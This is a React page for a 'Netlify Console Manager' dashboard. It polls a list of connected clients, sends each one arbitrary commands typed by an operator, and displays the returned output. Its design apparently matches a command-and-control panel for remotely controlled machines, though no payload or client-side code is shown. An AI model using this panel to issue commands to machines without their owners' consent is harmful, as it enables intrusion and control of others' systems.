import { useEffect, useState } from 'react';

export default function Home() {
  const [clients, setClients] = useState({});
  const [output, setOutput] = useState({});

  useEffect(() => {
    const interval = setInterval(() => {
      fetch('/api/clients').then(res => res.json()).then(setClients);
      Object.keys(clients).forEach(id => {
        fetch('/api/output/' + id).then(res => res.json()).then(data => {
          if (data.output) {
            setOutput(prev => ({ ...prev, [id]: data.output }));
          }
        });
      });
    }, 2000);
    return () => clearInterval(interval);
  }, [clients]);

  const sendCommand = async (clientId) => {
    const cmd = document.getElementById(`cmd-${clientId}`).value;
    await fetch(`/api/command/${clientId}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ command: cmd })
    });
    alert('Command sent to ' + clientId);
  };

  return (
    <main style={{ padding: 20 }}>
      <h1>Netlify Console Manager 🚀</h1>
      <h2>Clients:</h2>
      {Object.keys(clients).map(id => (
        <div key={id} style={{ marginBottom: 20 }}>
          <strong>{clients[id].username}</strong> ({id}) - {clients[id].status}
          <div>
            <input id={`cmd-${id}`} placeholder="Command" />
            <button onClick={() => sendCommand(id)}>Send</button>
          </div>
          <pre style={{ background: '#eee', padding: 10 }}>{output[id] || ''}</pre>
        </div>
      ))}
    </main>
  );
}
